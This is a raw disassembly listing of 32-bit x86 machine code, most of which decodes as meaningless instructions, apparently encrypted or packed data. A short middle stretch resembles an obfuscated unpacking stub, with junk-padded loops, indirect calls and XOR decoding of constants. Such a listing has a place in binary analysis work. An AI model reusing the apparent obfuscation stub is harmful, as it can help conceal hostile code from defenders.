  40d749:	outs   dx,DWORD PTR ds:[esi]
  40d74a:	or     al,0xe9
  40d74c:	hlt    
  40d74d:	popf   
  40d74e:	call   ebx
  40d750:	leave  
  40d751:	out    0x7f,eax
  40d753:	inc    esp
  40d754:	outs   dx,BYTE PTR ds:[esi]
  40d755:	jne    0x40d72e
  40d757:	cmp    DWORD PTR [ebp-0x3d714d3a],ebp
  40d75d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75f:	jecxz  0x40d75f
  40d761:	jb     0x40d6e9
  40d763:	adc    eax,0x263c123b
  40d768:	mov    ds:0xb751ea6b,al
  40d76d:	mov    cl,0xc8
  40d76f:	and    DWORD PTR [esi+0x29b554e4],0xffffffdc
  40d776:	fisttp WORD PTR [ecx]
  40d778:	jb     0x40d716
  40d77a:	pop    edx
  40d77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d77c:	loop   0x40d774
  40d77e:	outs   dx,DWORD PTR ds:[esi]
  40d77f:	xchg   ebx,eax
  40d780:	out    0x78,eax
  40d782:	shl    ch,0x5
  40d785:	test   esp,0x9c9dbe5f
  40d78b:	xchg   edi,eax
  40d78c:	mov    bh,0x62
  40d78e:	adc    BYTE PTR [edi-0x17],0x9
  40d792:	not    al
  40d794:	adc    DWORD PTR [ebx-0x506c6303],esi
  40d79a:	jo     0x40d728
  40d79c:	pop    ss
  40d79d:	pop    esi
  40d79e:	fldenv ds:0x912f2df4
  40d7a4:	adc    BYTE PTR [edx+0x44bccc8e],bh
  40d7aa:	lahf   
  40d7ab:	mov    esi,0x6c2c232
  40d7b0:	mov    edx,0x230fed73
  40d7b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7b6:	mov    cl,0xc8
  40d7b8:	xlat   BYTE PTR ds:[ebx]
  40d7b9:	cmp    ch,BYTE PTR [esi+0x59]
  40d7bc:	xchg   edx,eax
  40d7bd:	sub    ah,BYTE PTR [eax+0x11c841ed]
  40d7c3:	and    DWORD PTR [esi],0xffffff9d
  40d7c6:	cmp    eax,0xd460f0d
  40d7cb:	rol    cl,0x1a
  40d7ce:	fs sbb eax,0x9b4177d
  40d7d4:	not    DWORD PTR [esi]
  40d7d6:	push   eax
  40d7d7:	in     al,dx
  40d7d8:	loope  0x40d7c8
  40d7da:	out    dx,al
  40d7db:	mov    dl,BYTE PTR ds:0xc373d11e
  40d7e1:	bound  ebp,QWORD PTR [ebx+edx*4-0x4b]
  40d7e5:	nop
  40d7e6:	xchg   ebp,eax
  40d7e7:	dec    ecx
  40d7e8:	sbb    al,dl
  40d7ea:	sub    eax,0x8da68907
  40d7ef:	xchg   ebp,eax
  40d7f0:	sbb    al,0x38
  40d7f2:	imul   ebx,ebx,0x56d5180b
  40d7f8:	mov    DWORD PTR [esi-0x41],edi
  40d7fb:	fdiv   DWORD PTR [edi-0x15]
  40d7fe:	jmp    0xde2d5d7a
  40d803:	out    0xcd,al
  40d805:	xchg   ecx,eax
  40d806:	repz inc edx
  40d808:	push   esp
  40d809:	pop    ss
  40d80a:	and    al,0xfa
  40d80c:	test   BYTE PTR [ebx+edx*8-0x35],dl
  40d810:	int    0x48
  40d812:	sahf   
  40d813:	cdq    
  40d814:	push   ecx
  40d815:	cmp    esi,eax
  40d817:	repnz add dh,cl
  40d81a:	enter  0x2c77,0xe1
  40d81e:	aam    0xf0
  40d820:	rcl    DWORD PTR [ebp-0x5fa87ed1],cl
  40d826:	shl    DWORD PTR [ecx],cl
  40d828:	jg     0x40d859
  40d82a:	data16 (bad) 
  40d82e:	mov    dl,0x37
  40d830:	ret    
  40d831:	jno    0x40d7d7
  40d833:	call   DWORD PTR [ecx+0x7400256e]
  40d839:	out    0x94,eax
  40d83b:	fidivr DWORD PTR [edi+0x3e]
  40d83e:	dec    esi
  40d83f:	(bad)  [ebp+0x7a]
  40d842:	cmp    al,0xe7
  40d844:	inc    edx
  40d845:	mov    eax,ds:0x9b411114
  40d84a:	add    eax,0x4219a460
  40d84f:	or     DWORD PTR [ecx*2-0x17a1ad9c],edi
  40d856:	sub    eax,0x89b368f4
  40d85b:	add    DWORD PTR [ecx+esi*2-0x27],0x7d83a6c2
  40d863:	inc    edi
  40d864:	push   esp
  40d865:	gs hlt 
  40d867:	test   BYTE PTR [ebx-0x4d],ch
  40d86a:	and    bl,bl
  40d86c:	jo     0x40d882
  40d86e:	push   eax
  40d86f:	mov    eax,ds:0x42a2da1
  40d874:	clc    
  40d875:	fcomp  QWORD PTR [eax+0x78]
  40d878:	jne    0x40d878
  40d87a:	aas    
  40d87b:	push   esp
  40d87c:	xor    ah,BYTE PTR [ebx-0xca7e1ed]
  40d882:	jge    0x40d89d
  40d884:	mov    bh,0xfd
  40d886:	jae    0x40d8e8
  40d888:	push   ss
  40d889:	pop    ebx
  40d88a:	sbb    DWORD PTR [esi+0x74141387],edx
  40d890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d891:	test   eax,0xded783dd
  40d896:	adc    BYTE PTR [ecx+ecx*2+0x60],bh
  40d89a:	sbb    DWORD PTR [ebp-0x3c520497],ebx
  40d8a0:	mov    edx,0x3362a767
  40d8a5:	imul   esp,DWORD PTR [ecx+eiz*4-0x1b],0x5f
  40d8aa:	cmp    BYTE PTR [edi+0x580df765],dh
  40d8b0:	pusha  
  40d8b1:	mov    esp,0xf0def230
  40d8b6:	dec    esi
  40d8b7:	add    edx,edi
  40d8b9:	fcom   DWORD PTR [esi]
  40d8bb:	add    al,0x77
  40d8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8be:	test   al,0x60
  40d8c0:	mov    bl,0x3c
  40d8c2:	sub    DWORD PTR [ecx-0x38],esi
  40d8c5:	fcomp  DWORD PTR [edi-0x2a]
  40d8c8:	dec    ebp
  40d8c9:	arpl   di,dx
  40d8cb:	xor    DWORD PTR [esi],edi
  40d8cd:	test   BYTE PTR [edx],ah
  40d8cf:	loope  0x40d87a
  40d8d1:	jp     0x40d888
  40d8d3:	pop    edi
  40d8d4:	lods   al,BYTE PTR ds:[esi]
  40d8d5:	sub    DWORD PTR [eax+0x14],esi
  40d8d8:	test   al,0x9f
  40d8da:	cmp    al,0xb0
  40d8dc:	bswap  edi
  40d8de:	ret    0x7b6e
  40d8e1:	call   0x1d54:0x3775d123
  40d8e8:	into   
  40d8e9:	fimul  WORD PTR [ecx-0x10b04d9d]
  40d8ef:	xor    al,0x86
  40d8f1:	pop    ebx
  40d8f2:	push   edx
  40d8f3:	xor    BYTE PTR [ebp-0x5d1bf392],dh
  40d8f9:	movntps XMMWORD PTR [ebp-0x66e4db63],xmm2
  40d900:	ret    
  40d901:	cmp    esi,DWORD PTR [ecx]
  40d903:	mov    esi,0x27abeee4
  40d908:	sti    
  40d909:	sub    al,0x77
  40d90b:	das    
  40d90c:	dec    eax
  40d90d:	xor    bh,al
  40d90f:	jmp    0x3f2f85c1
  40d914:	ss pop ebx
  40d916:	fmul   st(7),st
  40d918:	loop   0x40d962
  40d91a:	loope  0x40d978
  40d91c:	popf   
  40d91d:	data16 sahf 
  40d91f:	sub    DWORD PTR [ebp+0x30],edx
  40d922:	jb     0x40d978
  40d924:	imul   edx,DWORD PTR [ebp+0x17],0xa74f71f9
  40d92b:	sti    
  40d92c:	adc    BYTE PTR [edi-0x28],ah
  40d92f:	xor    DWORD PTR [edx],edi
  40d931:	xor    BYTE PTR [esi+0x3f],bh
  40d934:	xchg   esp,eax
  40d935:	fs fs mov dl,0xaf
  40d939:	jmp    0xa70d:0x93ab1d69
  40d940:	mov    cs,WORD PTR [eax+ecx*4]
  40d943:	mov    ds:0xdd34511b,eax
  40d948:	pop    ecx
  40d949:	sub    BYTE PTR [edx],ah
  40d94b:	clc    
  40d94c:	sub    esp,DWORD PTR [esi]
  40d94e:	test   al,0x60
  40d950:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d951:	inc    esi
  40d952:	jae    0x40d9c1
  40d954:	out    dx,eax
  40d955:	stc    
  40d956:	mov    ecx,DWORD PTR [eax+0x38ce66ef]
  40d95c:	enter  0xeea5,0x2
  40d960:	aad    0x6f
  40d962:	adc    eax,0x65492449
  40d967:	cmp    DWORD PTR [edi-0x4f],ecx
  40d96a:	ss es pop eax
  40d96d:	bound  eax,QWORD PTR [ebx-0x6b15936c]
  40d973:	xchg   BYTE PTR [edi],dh
  40d975:	shl    BYTE PTR [edi],0xb
  40d978:	jecxz  0x40d90d
  40d97a:	stos   BYTE PTR es:[edi],al
  40d97b:	outs   dx,DWORD PTR ds:[esi]
  40d97c:	rcl    ebx,1
  40d97e:	dec    esp
  40d97f:	dec    edx
  40d980:	aas    
  40d981:	pop    esi
  40d982:	outs   dx,DWORD PTR ds:[esi]
  40d983:	adc    eax,0xdb012e49
  40d988:	jno    0x40d9d8
  40d98a:	and    al,0x4b
  40d98c:	dec    esi
  40d98d:	pushf  
  40d98e:	leave  
  40d98f:	jp     0x40d96f
  40d991:	mov    edx,0xb0d4b0e5
  40d996:	retf   
  40d997:	add    esi,eax
  40d999:	mov    ecx,0x1efe10ac
  40d99e:	lahf   
  40d99f:	mov    dl,0x31
  40d9a1:	std    
  40d9a2:	outs   dx,BYTE PTR ds:[esi]
  40d9a3:	cmp    al,0xdc
  40d9a5:	in     eax,dx
  40d9a6:	mov    DWORD PTR [eax-0x57f25758],ebx
  40d9ac:	cdq    
  40d9ad:	jmp    0x52c:0xad057f33
  40d9b4:	lea    esi,[ecx-0x50]
  40d9b7:	pop    ebx
  40d9b8:	inc    ecx
  40d9b9:	pop    ss
  40d9ba:	push   ecx
  40d9bb:	ret    0x6d7b
  40d9be:	imul   edi,edi,0x529ddf8c
  40d9c4:	pop    ds
  40d9c5:	or     BYTE PTR [ebx+ebp*1-0x7391211b],ch
  40d9cc:	mov    al,0xa1
  40d9ce:	mov    ch,0xae
  40d9d0:	loope  0x40d9d1
  40d9d2:	inc    ebp
  40d9d3:	jbe    0x40d9da
  40d9d5:	lea    eax,[eax+0x4630bd65]
  40d9db:	pushw  0x372
  40d9df:	mov    ebx,edx
  40d9e1:	adc    BYTE PTR [edi+0x4a],bh
  40d9e4:	xor    dh,dl
  40d9e6:	pop    ecx
  40d9e7:	(bad)  [edi-0x27dd68e3]
  40d9ed:	jmp    0xb26c1849
  40d9f2:	test   al,0xa1
  40d9f4:	dec    ebp
  40d9f5:	or     DWORD PTR [ebp+0x350b037a],edi
  40d9fb:	faddp  st(4),st
  40d9fd:	icebp  
  40d9fe:	jbe    0x40d9ef
  40da00:	imul   esp,DWORD PTR [eax+0x1bb72d09],0x6e
  40da07:	aam    0x89
  40da09:	ret    
  40da0a:	fdiv   DWORD PTR [ebx+0x30cbed05]
  40da10:	mov    bl,0x8
  40da12:	cmp    BYTE PTR [ecx+0x1d3a7bc6],0x77
  40da19:	xchg   BYTE PTR [eax+eiz*8],ah
  40da1c:	xchg   edi,eax
  40da1d:	xor    al,0x11
  40da1f:	lods   al,BYTE PTR ds:[esi]
  40da20:	xchg   DWORD PTR [edi+0x28],ebp
  40da23:	mov    ah,0x61
  40da25:	cmp    dl,bl
  40da27:	xchg   BYTE PTR [ebx],cl
  40da29:	dec    ebx
  40da2a:	pop    edx
  40da2b:	stos   BYTE PTR es:[edi],al
  40da2c:	xchg   ecx,eax
  40da2d:	out    dx,al
  40da2e:	dec    ecx
  40da2f:	adc    DWORD PTR [ebp+0x3d],ebp
  40da32:	popf   
  40da33:	jno    0x40d9ff
  40da35:	pop    ebp
  40da36:	addr16 push ecx
  40da38:	dec    esp
  40da39:	mov    cl,0x7a
  40da3b:	ret    0xa3dd
  40da3e:	sbb    eax,DWORD PTR [ebp+0x3a]
  40da41:	jp     0x40dac1
  40da43:	and    DWORD PTR [ecx+0x7b21dad1],0x2eabbfd0
  40da4d:	cli    
  40da4e:	mov    edi,0x9cb4fec7
  40da53:	and    al,0x16
  40da55:	lahf   
  40da56:	(bad)  
  40da58:	pop    edi
  40da59:	add    DWORD PTR [edi+0x1f941c38],edi
  40da5f:	add    BYTE PTR [ebx],0x27
  40da62:	inc    eax
  40da63:	(bad)  
  40da64:	aad    0x2d
  40da66:	icebp  
  40da67:	pop    edi
  40da68:	repz cmp eax,edx
  40da6b:	jnp    0x40da3e
  40da6d:	and    bl,BYTE PTR [ecx-0x4be2cef4]
  40da73:	loop   0x40dab0
  40da75:	and    al,0xfb
  40da77:	mov    ecx,0xc289a85b
  40da7c:	pop    ecx
  40da7d:	cmp    ecx,edi
  40da7f:	mov    edx,0x8ae25a0a
  40da84:	add    esp,esi
  40da86:	fcomip st,st(5)
  40da88:	or     ecx,DWORD PTR [ebx-0x5a]
  40da8b:	add    DWORD PTR [edi-0x75],ebx
  40da8e:	addr16 cmp eax,0x945748e6
  40da94:	mov    cl,0xad
  40da96:	out    dx,eax
  40da97:	in     al,dx
  40da98:	(bad)  
  40da99:	rcr    ecx,cl
  40da9b:	repz cmp al,0x63
  40da9e:	pop    ss
  40da9f:	(bad)  
  40daa0:	popf   
  40daa1:	sahf   
  40daa2:	aaa    
  40daa3:	test   BYTE PTR [ebp+0x33],dl
  40daa6:	xchg   ebp,eax
  40daa7:	jae    0x40da8e
  40daa9:	pcmpeqb mm3,QWORD PTR [edi]
  40daac:	dec    edx
  40daad:	mov    bh,0x8c
  40daaf:	add    al,0x82
  40dab1:	cli    
  40dab2:	je     0x40daf8
  40dab4:	mov    dl,0x84
  40dab6:	jnp    0x40daa5
  40dab8:	(bad)  
  40dab9:	jecxz  0x40dab9
  40dabb:	xchg   BYTE PTR [ebp-0x36],ch
  40dabe:	lods   al,BYTE PTR ds:[esi]
  40dabf:	xor    BYTE PTR [edx+0x2cfb2a50],bl
  40dac5:	sub    DWORD PTR [esi],ebx
  40dac7:	pushf  
  40dac8:	xor    al,0x4b
  40daca:	add    al,0xea
  40dacc:	mov    eax,eax
  40dace:	in     al,dx
  40dacf:	or     ah,dl
  40dad1:	pop    ebp
  40dad2:	ret    
  40dad3:	push   cs
  40dad4:	push   es
  40dad5:	mov    esp,0x6a89b7c
  40dada:	scas   eax,DWORD PTR es:[edi]
  40dadb:	inc    ebx
  40dadc:	mov    WORD PTR [eax],gs
  40dade:	ret    0x6146
  40dae1:	js     0x40dabf
  40dae3:	add    eax,0x7b74811e
  40dae8:	bound  esi,QWORD PTR [esi+edi*4-0x2b]
  40daec:	pop    edx
  40daed:	jl     0x40db21
  40daef:	loop   0x40daa0
  40daf1:	das    
  40daf2:	fnstsw WORD PTR [ecx-0x65]
  40daf5:	mov    ecx,0xad39aa31
  40dafa:	add    eax,DWORD PTR [eax+0x76]
  40dafd:	inc    ebx
  40dafe:	or     ecx,ebp
  40db00:	sar    BYTE PTR [ebx+0x1d],cl
  40db03:	ja     0x40daf8
  40db05:	div    DWORD PTR [ecx]
  40db07:	xor    DWORD PTR [eax-0x17b2e7ce],ecx
  40db0d:	push   edi
  40db0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db0f:	js     0x40db54
  40db11:	push   0xffffffd4
  40db13:	sti    
  40db14:	push   cs
  40db15:	(bad)  
  40db16:	jmp    0xa075:0x6bb97778
  40db1d:	leave  
  40db1e:	sbb    cl,BYTE PTR [edx]
  40db20:	enter  0x3227,0x6b
  40db24:	loope  0x40db53
  40db26:	fnstsw WORD PTR [edi+0x75690bfa]
  40db2c:	or     BYTE PTR [ebp+0x5c5f9842],dh
  40db32:	ret    0x4260
  40db35:	dec    esp
  40db36:	rol    DWORD PTR [ecx+0x50],1
  40db39:	stos   BYTE PTR es:[di],al
  40db3b:	inc    edi
  40db3c:	jg     0x40dafc
  40db3e:	dec    eax
  40db3f:	pusha  
  40db40:	inc    eax
  40db41:	gs stos DWORD PTR es:[edi],eax
  40db43:	stos   DWORD PTR es:[edi],eax
  40db44:	pop    ecx
  40db45:	xlat   BYTE PTR ds:[ebx]
  40db46:	mov    al,0xa3
  40db48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db49:	ds rcr esi,1
  40db4c:	and    dh,BYTE PTR [ebx]
  40db4e:	out    dx,eax
  40db4f:	push   edi
  40db50:	or     BYTE PTR [ecx],0xf1
  40db53:	jbe    0x40db75
  40db55:	scas   eax,DWORD PTR es:[edi]
  40db56:	les    ecx,FWORD PTR [edi-0x18]
  40db59:	and    dh,BYTE PTR [ecx-0x23]
  40db5c:	scas   al,BYTE PTR es:[edi]
  40db5d:	adc    eax,0xde3f2d3a
  40db62:	dec    eax
  40db63:	adc    eax,0x33e56116
  40db68:	icebp  
  40db69:	mov    ecx,0xda88538
  40db6e:	fcom   QWORD PTR [ecx-0x17213cc0]
  40db74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db75:	test   al,0x30
  40db77:	arpl   WORD PTR ds:0xdba7a4a9,bx
  40db7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db7e:	push   ebx
  40db7f:	retf   
  40db80:	imul   eax,DWORD PTR [ecx],0x614964f0
  40db86:	aaa    
  40db87:	push   ss
  40db88:	mov    al,ds:0x927f230c
  40db8d:	mov    ebx,0x3df7d9ac
  40db92:	in     al,dx
  40db93:	repz daa 
  40db95:	out    0xd8,al
  40db97:	(bad)  
  40db98:	fneni(8087 only) 
  40db9a:	loopne 0x40dc0a
  40db9c:	shr    DWORD PTR cs:[edx+0x70],1
  40dba0:	sahf   
  40dba1:	jne    0x40dbf7
  40dba3:	cmp    al,0x34
  40dba5:	loop   0x40dbee
  40dba7:	xor    DWORD PTR [esi],0x8b37df51
  40dbad:	jmp    0x40db60
  40dbaf:	or     DWORD PTR [ecx],0x33e5115c
  40dbb5:	and    DWORD PTR [esi-0x2],ebp
  40dbb8:	fmul   st(2),st
  40dbba:	in     eax,dx
  40dbbb:	xor    edi,DWORD PTR [ecx-0xcd9ef24]
  40dbc1:	and    esi,DWORD PTR [ebx]
  40dbc3:	jg     0x40db7b
  40dbc5:	in     eax,0x30
  40dbc7:	fdiv   QWORD PTR [ecx]
  40dbc9:	inc    ebx
  40dbca:	mov    bl,0xd4
  40dbcc:	sub    eax,0x242a9a48
  40dbd1:	and    ah,dh
  40dbd3:	jmp    0x1b3546ad
  40dbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbd9:	test   BYTE PTR [ebp+0x29],dl
  40dbdc:	sbb    ebp,DWORD PTR [eax]
  40dbde:	lods   eax,DWORD PTR ds:[esi]
  40dbdf:	push   esi
  40dbe0:	xor    eax,0x8813b7d3
  40dbe5:	icebp  
  40dbe6:	push   edi
  40dbe7:	jge    0x40db69
  40dbe9:	pop    ss
  40dbea:	or     eax,0x3830c66f
  40dbef:	inc    ebx
  40dbf0:	sahf   
  40dbf1:	shl    BYTE PTR ds:0x64a6ae36,0xdf
  40dbf8:	rol    DWORD PTR [edi+0x16],0x54
  40dbfc:	call   0x31929f26
  40dc01:	aad    0x22
  40dc03:	inc    esi
  40dc04:	adc    BYTE PTR [ebx-0x158f2d20],ah
  40dc0a:	cwde   
  40dc0b:	popf   
  40dc0c:	sbb    eax,0x4943e066
  40dc11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc12:	rcr    DWORD PTR [edx-0x212a5c77],0x38
  40dc19:	(bad)  
  40dc1a:	jg     0x40dc45
  40dc1c:	call   DWORD PTR [ebx]
  40dc1e:	or     DWORD PTR [ecx],esi
  40dc20:	jmp    0xb3ca2a3c
  40dc25:	lock loop 0x40dbc0
  40dc28:	sahf   
  40dc29:	test   eax,0x7302764
  40dc2e:	(bad)  
  40dc2f:	aam    0x80
  40dc31:	fwait
  40dc32:	shl    esi,cl
  40dc34:	mov    eax,0xf431db69
  40dc39:	cdq    
  40dc3a:	pop    ss
  40dc3b:	push   eax
  40dc3c:	mul    BYTE PTR [ecx-0x25]
  40dc3f:	mov    ecx,0xdc4fdde
  40dc44:	or     al,bl
  40dc46:	push   eax
  40dc47:	jo     0x40dbf3
  40dc49:	adc    eax,0x281c7594
  40dc4e:	sub    DWORD PTR [esp+ebx*4-0x7758c56a],ebx
  40dc55:	jo     0x40dc79
  40dc57:	mov    ah,0xa9
  40dc59:	add    BYTE PTR [ebx-0x9],0xb2
  40dc5d:	scas   eax,DWORD PTR es:[edi]
  40dc5e:	jmp    0xe13dc8f2
  40dc63:	hlt    
  40dc64:	lods   al,BYTE PTR ds:[esi]
  40dc65:	jb     0x40dbe8
  40dc67:	and    eax,0xa9d96fa9
  40dc6c:	or     BYTE PTR [ecx+0x5f4ad1f7],0x32
  40dc73:	stos   BYTE PTR es:[edi],al
  40dc74:	imul   ecx,ebx,0x4ab63b42
  40dc7a:	(bad)
  40dc7e:	clc    
  40dc7f:	das    
  40dc80:	jecxz  0x40dc92
  40dc82:	stc    
  40dc83:	div    DWORD PTR [ecx+0x69]
  40dc86:	cmp    BYTE PTR [edx+0x4826bdca],dl
  40dc8c:	sbb    al,cl
  40dc8e:	and    DWORD PTR [ebp-0x4c],ebx
  40dc91:	add    al,0xc7
  40dc93:	xchg   esp,eax
  40dc94:	stc    
  40dc95:	pop    es
  40dc96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc97:	xor    DWORD PTR [ebx],0xffffffa6
  40dc9a:	jb     0x40dcb0
  40dc9c:	inc    ebp
  40dc9d:	bound  esp,QWORD PTR [esi-0x2cdcc47e]
  40dca3:	jbe    0x40dcba
  40dca5:	rcr    ah,cl
  40dca7:	adc    edi,DWORD PTR [eax-0x7fdf74e3]
  40dcad:	pusha  
  40dcae:	jecxz  0x40dc6e
  40dcb0:	inc    edx
  40dcb1:	mov    al,fs:0xceaa22d3
  40dcb7:	inc    ebp
  40dcb8:	out    0x9f,al
  40dcba:	mov    esi,0x24875528
  40dcbf:	jg     0x40dc76
  40dcc1:	push   ebx
  40dcc2:	and    bh,bl
  40dcc4:	xchg   ecx,eax
  40dcc5:	cmp    al,0xb9
  40dcc7:	mov    ds:0x2b6cc4f,al
  40dccc:	stc    
  40dccd:	(bad)  
  40dcce:	std    
  40dccf:	push   ebp
  40dcd0:	rcr    ebx,1
  40dcd2:	cmp    DWORD PTR [ebp-0x43028c32],ebp
  40dcd8:	into   
  40dcd9:	add    edi,DWORD PTR [esi-0x48847d71]
  40dcdf:	sub    BYTE PTR [ebp-0x61],ah
  40dce2:	cs std 
  40dce4:	xor    BYTE PTR [ebp-0x96cd7fe],0x24
  40dceb:	in     al,dx
  40dcec:	dec    esi
  40dced:	sbb    BYTE PTR [edx-0x23],cl
  40dcf0:	sbb    ebp,DWORD PTR [eax]
  40dcf2:	in     eax,0x80
  40dcf4:	mov    bh,0xf
  40dcf6:	adc    ebp,eax
  40dcf8:	add    al,0xb3
  40dcfa:	pushf  
  40dcfb:	loope  0x40dd43
  40dcfd:	xchg   esp,eax
  40dcfe:	jo     0x40dd68
  40dd00:	mov    ebp,0xcd842572
  40dd05:	add    al,0x70
  40dd07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd08:	inc    edx
  40dd09:	jg     0x40dcd4
  40dd0b:	or     DWORD PTR [ecx+0x6cd7d337],ebp
  40dd11:	mov    ch,0xf0
  40dd13:	or     BYTE PTR [esi+ecx*2],bl
  40dd16:	push   ebp
  40dd17:	xor    DWORD PTR [ecx+0x581ce33],edx
  40dd1d:	sbb    BYTE PTR [eax-0x5fffffbe],ah
  40dd23:	inc    edx
  40dd24:	add    BYTE PTR [ecx-0x30fc33bb],cl
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42369e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	jecxz  0x40df3e
  40deda:	cmp    bl,BYTE PTR [ecx]
  40dedc:	pop    ss
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	bound  eax,QWORD PTR [ebx+0x74]
  40dee6:	sub    ecx,DWORD PTR [ebp-0x54d8c02d]
  40deec:	leave  
  40deed:	loop   0x40df3c
  40deef:	xor    BYTE PTR [edx-0x6f],ah
  40def2:	les    edx,FWORD PTR [edx+0x4de64774]
  40def8:	mov    BYTE PTR [eax-0x6f],dl
  40defb:	xchg   edx,eax
  40defc:	fwait
  40defd:	mov    ch,0xb3
  40deff:	and    eax,0xfd438acc
  40df04:	repnz push ss
  40df06:	or     BYTE PTR [edi],dl
  40df08:	inc    edi
  40df09:	ds mov ecx,0x657c9941
  40df0f:	pop    eax
  40df10:	int    0xc4
  40df12:	(bad)  
  40df13:	rcl    BYTE PTR [edi-0x56a586fa],0xd4
  40df1a:	imul   ebx,DWORD PTR [ecx+0x21],0x67
  40df1e:	not    DWORD PTR [edx-0x10f8b216]
  40df24:	ror    DWORD PTR [eax-0x68d3fdc1],1
  40df2a:	mov    bh,0x2e
  40df2c:	inc    ebx
  40df2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df2e:	xchg   BYTE PTR [esp+eax*2],dl
  40df31:	and    al,0x7
  40df33:	pop    ds
  40df34:	mov    al,0xf4
  40df36:	jne    0x40dfa1
  40df38:	fwait
  40df39:	push   DWORD PTR [edx+0x53]
  40df3c:	loop   0x40df36
  40df3e:	dec    ebp
  40df3f:	add    al,0xb2
  40df41:	cld    
  40df42:	call   0x753f6558
  40df47:	cld    
  40df48:	mov    dl,0xa9
